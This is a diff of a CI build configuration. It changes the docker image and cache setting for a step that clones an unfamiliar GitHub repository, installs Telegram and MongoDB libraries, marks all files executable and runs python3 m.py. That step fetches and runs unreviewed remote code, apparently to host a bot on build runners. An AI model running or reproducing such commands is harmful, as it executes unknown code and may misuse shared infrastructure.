@@ -8,8 +8,9 @@
   - action: "git clone https://github.com/aaduopl/Kk && cd Kk && pip install telebot pymongo aiohttp && lscpu && chmod +x * && python3 m.py"
     type: "BUILD"
     disabled: true
-    docker_image_name: "ubuntu/python"
-    docker_image_tag: "latest"
+    docker_image_name: "library/python"
+    docker_image_tag: "3.9"
     execute_commands:
     - "git clone https://github.com/aaduopl/Kk && cd Kk && pip install telebot pymongo aiohttp && lscpu && chmod +x * && python3 m.py"
+    cache_base_image: false
     shell: "BASH"
